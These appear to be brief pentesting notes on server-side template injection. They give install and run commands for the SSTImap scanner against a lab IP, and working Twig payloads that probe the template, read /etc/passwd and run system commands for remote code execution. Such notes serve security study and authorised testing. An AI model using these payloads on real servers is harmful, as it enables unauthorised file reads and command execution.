**SSTImap**
```shell-session
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt
python3 sstimap.py 
```


**Example command:**
```shell-session
python3 sstimap.py -u http://172.17.0.2/index.php?name=test
```


**Brute Force Wordlist**
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md


Used to gain more information on current template
```twig
{{ _self }}
```

Used to read local files
```twig
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

Gaining RCE on Twig using SSTI
```twig
{{ ['id'] | filter('system') }}
```
